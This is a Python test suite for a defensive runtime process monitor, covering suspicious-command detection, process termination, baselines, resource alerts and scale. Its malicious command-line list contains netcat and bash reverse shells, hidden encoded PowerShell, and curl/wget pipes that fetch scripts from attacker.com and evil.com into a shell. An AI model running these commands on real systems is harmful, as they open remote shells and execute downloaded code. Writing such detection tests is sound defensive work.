"""
HEAVY UNSEEN DATA TEST — Feature #7 Runtime/Process Monitoring
===============================================================
Phase 1: Advanced Regex & Cmdline Evasion Tests
Phase 2: Scale testing with mocked psutil processes (1000+ processes)
Phase 3: Resource monitoring boundary testing
"""
import sys, os, time, re, json
import unittest
from unittest.mock import patch, MagicMock

_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, _root)
sys.path.insert(0, os.path.join(_root, "guardian"))

from guardian.runtime.monitor import RuntimeMonitor

RESULTS = {}

def run_test(name, fn):
    try:
        fn()
        RESULTS[name] = "PASS"
        print(f"  [PASS] {name}")
    except AssertionError as e:
        RESULTS[name] = f"FAIL: {e}"
        print(f"  [FAIL] {name}: {e}")
    except Exception as e:
        RESULTS[name] = f"ERROR: {type(e).__name__}: {e}"
        print(f"  [ERROR] {name}: {type(e).__name__}: {e}")

# Unseen Malicious Command Lines (Generated & Evaded)
MALICIOUS_CMDLINES = [
    # Netcat variants
    "nc -e /bin/sh 10.0.0.1 4444",
    "nc.exe -nv 10.0.0.1 4444 -e cmd.exe",
    "C:\\tools\\nc.exe -nlvp 4444 -e C:\\windows\\system32\\cmd.exe",
    
    # Bash variants
    "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
    "/bin/bash -i > /dev/tcp/192.168.1.1/443 0<&1 2>&1",
    
    # PowerShell variants
    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA",
    "POWERSHELL -ENC dwBoAG8AYQBtAGkA",
    
    # Curl/Wget variants
    "curl -s http://attacker.com/malware.sh | bash",
    "curl http://10.0.0.1/shell | sh",
    "wget -qO- http://attacker.com/script.sh | bash",
    "wget http://evil.com/run.sh | sh",
]

# Benign Cmdlines that shouldn't be blocked (False Positives)
BENIGN_CMDLINES = [
    "bash -c 'ls -la'",
    "bash --version",
    "nc -zv 192.168.1.1 22", # Port scanning, not reverse shell
    "curl -O https://github.com/user/repo/archive/refs/heads/main.zip",
    "wget https://example.com/file.tar.gz",
    "powershell -File script.ps1",
    "powershell -Command \"Get-Process\"",
    "curl https://api.ipify.org | grep '[0-9]'", # Piped to grep, not sh
    "wget -qO- https://api.github.com/users/octocat | jq .",
]

class MockProcess:
    def __init__(self, pid, name, cmdline, exe="/usr/bin/mock"):
        self.pid = pid
        self._name = name
        self._cmdline = cmdline
        self._exe = exe
        self.terminated = False
        self.killed = False
        self.info = {
            'pid': pid,
            'name': name,
            'cmdline': cmdline,
            'exe': exe
        }

    def name(self): return self._name
    def cmdline(self): return self._cmdline
    def exe(self): return self._exe
    def terminate(self): self.terminated = True
    def kill(self): self.killed = True
    def wait(self, timeout=None): pass

def test_regex_malicious():
    monitor = RuntimeMonitor({})
    missed = []
    for cmd in MALICIOUS_CMDLINES:
        if not monitor._is_suspicious_cmdline(cmd):
            missed.append(cmd)
    assert not missed, f"Missed {len(missed)} malicious cmdlines: {missed}"

def test_regex_benign():
    monitor = RuntimeMonitor({})
    flagged = []
    for cmd in BENIGN_CMDLINES:
        if monitor._is_suspicious_cmdline(cmd):
            flagged.append(cmd)
    assert not flagged, f"Flagged {len(flagged)} benign cmdlines as malicious: {flagged}"

def test_process_termination_logic():
    monitor = RuntimeMonitor({
        "runtime_monitoring": {
            "blocked_processes": ["malware.exe", "calc.exe"]
        }
    })
    
    # Mock some processes
    procs = [
        MockProcess(100, "explorer.exe", ["explorer.exe"]),
        MockProcess(101, "calc.exe", ["calc.exe"]), # Blocked by name
        MockProcess(102, "bash", ["bash", "-i", ">&", "/dev/tcp/10.0.0.1/8080", "0>&1"]), # Blocked by cmdline
        MockProcess(103, "legit.exe", ["legit.exe"]),
    ]
    
    # Mock psutil
    with patch("psutil.process_iter", return_value=procs):
        monitor.check_processes()
        
    assert not procs[0].terminated
    assert procs[1].terminated, "Failed to terminate calc.exe"
    assert procs[2].terminated, "Failed to terminate reverse shell bash"
    assert not procs[3].terminated

def test_baseline_preservation():
    monitor = RuntimeMonitor({
        "runtime_monitoring": {
            "blocked_processes": ["already_running_malware.exe"]
        }
    })
    
    # Add to baseline
    monitor.safe_pids.add(999)
    
    procs = [
        MockProcess(999, "already_running_malware.exe", []), # In baseline, should NOT be blocked
        MockProcess(1000, "already_running_malware.exe", []), # NOT in baseline, SHOULD be blocked
    ]
    
    with patch("psutil.process_iter", return_value=procs):
        monitor.check_processes()
        
    assert not procs[0].terminated, "Terminated baseline process!"
    assert procs[1].terminated, "Failed to terminate non-baseline process"

def test_resource_monitoring_alerts():
    monitor = RuntimeMonitor({
        "runtime_monitoring": {
            "max_cpu_percent": 80.0,
            "max_memory_percent": 85.0
        }
    })
    
    with patch("psutil.cpu_percent", return_value=85.0), \
         patch("psutil.virtual_memory") as mock_mem:
         
        mock_mem.return_value.percent = 90.0
        alerts = monitor.check_resources()
        
    assert len(alerts) == 2, f"Expected 2 alerts, got {len(alerts)}"
    assert "High CPU usage" in alerts[0]
    assert "High Memory usage" in alerts[1]

def test_scale_1000_processes():
    monitor = RuntimeMonitor({})
    # Generate 1000 benign processes and 5 malicious ones
    procs = [MockProcess(i, f"proc_{i}.exe", [f"proc_{i}.exe"]) for i in range(1000)]
    
    malicious_indices = [100, 250, 500, 750, 900]
    for idx in malicious_indices:
        procs[idx] = MockProcess(idx, "bash", ["bash", "-i", ">&", "/dev/tcp/10.0.0.1/4444"])
        
    start = time.perf_counter()
    with patch("psutil.process_iter", return_value=procs):
        monitor.check_processes()
    elapsed = (time.perf_counter() - start) * 1000
    
    for idx in malicious_indices:
        assert procs[idx].terminated, f"Failed to terminate at index {idx}"
        
    print(f"      Scale test: Scanned {len(procs)} processes in {elapsed:.1f}ms")
    assert elapsed < 500, f"Scale test too slow: {elapsed:.1f}ms"


# ═══════════════════════════════════════════════════════════════════════════
# ADVANCED 2026-STANDARD FEATURES
# ═══════════════════════════════════════════════════════════════════════════

def test_get_stats():
    monitor = RuntimeMonitor({})
    stats = monitor.get_stats()
    assert "total_scans" in stats
    assert "total_blocked" in stats
    assert "blocked_by_name" in stats
    assert "blocked_by_cmdline" in stats
    assert "blocked_by_hash" in stats
    assert "resource_alerts" in stats
    assert "blocked_processes_count" in stats
    assert "cmdline_patterns_count" in stats
    assert "baseline_pids_count" in stats
    assert "is_running" in stats
    assert stats["total_scans"] == 0
    assert stats["is_running"] is False

def test_stats_tracking():
    monitor = RuntimeMonitor({
        "runtime_monitoring": {
            "blocked_processes": ["malware.exe"]
        }
    })
    procs = [
        MockProcess(501, "malware.exe", ["malware.exe"]),
        MockProcess(502, "safe.exe", ["safe.exe"]),
    ]
    with patch("psutil.process_iter", return_value=procs):
        monitor.check_processes()
    
    stats = monitor.get_stats()
    assert stats["total_scans"] == 1
    assert stats["total_blocked"] >= 1
    assert stats["blocked_by_name"] >= 1

def test_get_blocked_log():
    monitor = RuntimeMonitor({
        "runtime_monitoring": {
            "blocked_processes": ["malware.exe"]
        }
    })
    procs = [
        MockProcess(601, "malware.exe", ["malware.exe"]),
    ]
    with patch("psutil.process_iter", return_value=procs):
        monitor.check_processes()
    
    log = monitor.get_blocked_log()
    assert len(log) >= 1
    assert log[0]["pid"] == 601
    assert log[0]["name"] == "malware.exe"
    assert "reason" in log[0]
    assert "timestamp" in log[0]

def test_add_remove_blocked_process():
    monitor = RuntimeMonitor({})
    assert "evil.exe" not in monitor.blocked_processes
    assert monitor.add_blocked_process("evil.exe") is True
    assert "evil.exe" in monitor.blocked_processes
    # Adding again should return False (already exists)
    assert monitor.add_blocked_process("evil.exe") is False
    # Remove
    assert monitor.remove_blocked_process("evil.exe") is True
    assert "evil.exe" not in monitor.blocked_processes
    # Remove again should return False
    assert monitor.remove_blocked_process("evil.exe") is False

def test_add_blocked_cmdline_pattern():
    monitor = RuntimeMonitor({})
    initial_count = len(monitor.blocked_cmdline_patterns)
    assert monitor.add_blocked_cmdline_pattern(r"python.*-c.*import\s+os") is True
    assert len(monitor.blocked_cmdline_patterns) == initial_count + 1
    # Verify the new pattern catches what it should
    assert monitor._is_suspicious_cmdline("python -c 'import os; os.system(\"whoami\")'")
    # Invalid regex should fail gracefully
    assert monitor.add_blocked_cmdline_pattern("[invalid") is False

def test_export_blocklist():
    monitor = RuntimeMonitor({
        "runtime_monitoring": {
            "blocked_processes": ["calc.exe", "nc.exe"],
            "max_cpu_percent": 85.0,
        }
    })
    export = monitor.export_blocklist()
    assert "blocked_processes" in export
    assert "blocked_process_hashes" in export
    assert "blocked_cmdline_patterns" in export
    assert "max_cpu" in export
    assert "max_memory" in export
    assert "calc.exe" in export["blocked_processes"]
    assert export["max_cpu"] == 85.0

def test_scan_once():
    monitor = RuntimeMonitor({
        "runtime_monitoring": {
            "blocked_processes": ["rogue.exe"],
            "max_cpu_percent": 50.0,
        }
    })
    procs = [
        MockProcess(701, "rogue.exe", ["rogue.exe"]),
        MockProcess(702, "safe.exe", ["safe.exe"]),
    ]
    with patch("psutil.process_iter", return_value=procs), \
         patch("psutil.cpu_percent", return_value=60.0), \
         patch("psutil.virtual_memory") as mock_mem:
        mock_mem.return_value.percent = 40.0
        alerts = monitor.scan_once()
    
    # Should have at least 1 resource alert (CPU) + 1 process block
    resource_alerts = [a for a in alerts if a["type"] == "resource"]
    process_alerts = [a for a in alerts if a["type"] == "process_blocked"]
    assert len(resource_alerts) >= 1, f"Expected resource alert, got {resource_alerts}"
    assert len(process_alerts) >= 1, f"Expected process block, got {process_alerts}"

def test_hot_add_then_detect():
    """Full integration: hot-add a process, then scan and verify it gets caught."""
    monitor = RuntimeMonitor({})
    monitor.add_blocked_process("sneaky.exe")
    
    procs = [
        MockProcess(801, "sneaky.exe", ["sneaky.exe"]),
        MockProcess(802, "normal.exe", ["normal.exe"]),
    ]
    with patch("psutil.process_iter", return_value=procs):
        monitor.check_processes()
    
    assert procs[0].terminated, "Hot-added process should be terminated"
    assert not procs[1].terminated
    log = monitor.get_blocked_log()
    assert any(e["name"] == "sneaky.exe" for e in log)

def test_get_suspicious_processes():
    monitor = RuntimeMonitor({
        "runtime_monitoring": {"blocked_processes": ["rogue.exe"]}
    })
    # get_suspicious_processes is a legacy read-only method
    result = monitor.get_suspicious_processes()
    assert isinstance(result, list)

def test_start_stop():
    monitor = RuntimeMonitor({})
    # stop without start should not error
    monitor.stop()
    assert monitor._thread is None


def main():
    print("=" * 72)
    print("  HEAVY UNSEEN DATA TEST — Feature #7 Runtime/Process Monitoring")
    print("=" * 72)

    print("\n  [A] Core Regex & Detection")
    run_test("regex_malicious_cmdlines", test_regex_malicious)
    run_test("regex_benign_cmdlines", test_regex_benign)
    run_test("process_termination_logic", test_process_termination_logic)
    run_test("baseline_preservation", test_baseline_preservation)
    run_test("resource_monitoring_alerts", test_resource_monitoring_alerts)
    run_test("scale_1000_processes", test_scale_1000_processes)

    print("\n  [B] Advanced 2026-Standard Features")
    run_test("get_stats", test_get_stats)
    run_test("stats_tracking", test_stats_tracking)
    run_test("get_blocked_log", test_get_blocked_log)
    run_test("add_remove_process", test_add_remove_blocked_process)
    run_test("add_cmdline_pattern", test_add_blocked_cmdline_pattern)
    run_test("export_blocklist", test_export_blocklist)
    run_test("scan_once", test_scan_once)
    run_test("hot_add_then_detect", test_hot_add_then_detect)
    run_test("get_suspicious_processes", test_get_suspicious_processes)
    run_test("start_stop", test_start_stop)

    passed = sum(1 for v in RESULTS.values() if v == "PASS")
    total = len(RESULTS)
    failed = {k: v for k, v in RESULTS.items() if v != "PASS"}

    print(f"\n{'='*72}")
    print(f"  RESULT: {passed}/{total} tests passed")
    if failed:
        print(f"\n  FAILURES ({len(failed)}):")
        for k, v in failed.items(): print(f"    {k}: {v}")
    print(f"{'='*72}")

    out = os.path.join(_root, "artifacts", "evidence", "runtime_monitor_advanced.json")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, "w") as f:
        json.dump({"passed": passed, "total": total, "results": RESULTS}, f, indent=2)
    print(f"\n  Saved: {os.path.abspath(out)}")
    return 0 if passed == total else 1

if __name__ == "__main__":
    sys.exit(main())
